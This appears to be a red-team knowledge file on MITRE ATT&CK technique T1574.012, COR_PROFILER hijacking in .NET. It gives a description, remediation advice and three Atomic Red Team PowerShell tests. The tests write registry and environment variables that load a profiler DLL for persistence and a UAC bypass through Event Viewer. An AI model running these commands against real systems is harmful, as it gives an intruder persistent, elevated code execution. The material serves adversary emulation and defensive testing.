---
name: "T1574.012_corprofiler"
description: "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1574.012
  - persistence
  - privilege-escalation
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1574.012"
tactic: "persistence"
all_tactics:
  - persistence
  - privilege-escalation
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1574/012"
tech_stack:
  - windows
cwe_ids:
  - CWE-276
chains_with:
  - T1574
  - T1574.001
  - T1574.004
  - T1574.005
  - T1574.006
  - T1574.007
  - T1574.008
  - T1574.009
  - T1574.010
  - T1574.011
  - T1574.013
  - T1574.014
prerequisites:
  - T1574
severity_boost:
  T1574: "Chain with T1574 for deeper attack path"
  T1574.001: "Chain with T1574.001 for deeper attack path"
  T1574.004: "Chain with T1574.004 for deeper attack path"
---

# T1574.012 COR_PROFILER

> **Sub-technique of:** T1574

## High-Level Description

Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.

Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.

## Kill Chain Phase

- Persistence (TA0003)
- Privilege Escalation (TA0004)
- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if COR_PROFILER technique is applicable to target environment
- [ ] Check Windows systems for indicators of COR_PROFILER
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: User scope COR_PROFILER

Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).
The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.
Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.
If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,
the notepad process will not execute with high integrity.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

**Supported Platforms:** windows

```powershell
Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value "#{file_name}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null
Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC
```

**Dependencies:**
- "#{file_name}" must be present

### Atomic Test 2: System Scope COR_PROFILER

Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.
The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity
level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will
still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Write-Host "Creating system environment variables" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null
```

**Dependencies:**
- "#{file_name}" must be present

### Atomic Test 3: Registry-free process scope COR_PROFILER

Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/

**Supported Platforms:** windows

```powershell
$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = '"#{file_name}"'
POWERSHELL -c 'Start-Sleep 1'
```

**Dependencies:**
- "#{file_name}" must be present


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to COR_PROFILER by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1574.012 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1024 Restrict Registry Permissions
Ensure proper permissions are set for Registry hives to prevent users from modifying keys associated with COR_PROFILER.

### M1038 Execution Prevention
Identify and block potentially malicious unmanaged COR_PROFILER profiling DLLs by using application control solutions like AppLocker that are capable of auditing and/or blocking unapproved DLLs.

### M1018 User Account Management
Limit the privileges of user accounts so that only authorized administrators can edit system environment variables.


## Detection

### Detection Strategy for Hijack Execution Flow using the Windows COR_PROFILER.


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| COR_PROFILER technique applicable | High | Persistence |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-276 | Incorrect Default Permissions |


## References

- [Microsoft Profiling Mar 2017](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview)
- [Microsoft COR_PROFILER Feb 2013](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100))
- [RedCanary Mockingbird May 2020](https://redcanary.com/blog/blue-mockingbird-cryptominer/)
- [Red Canary COR_PROFILER May 2020](https://redcanary.com/blog/cor_profiler-for-persistence/)
- [Almond COR_PROFILER Apr 2019](https://offsec.almond.consulting/UAC-bypass-dotnet.html)
- [GitHub OmerYa Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
- [subTee .NET Profilers May 2017](https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html)
- [Atomic Red Team - T1574.012](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1574.012)
- [MITRE ATT&CK - T1574.012](https://attack.mitre.org/techniques/T1574/012)
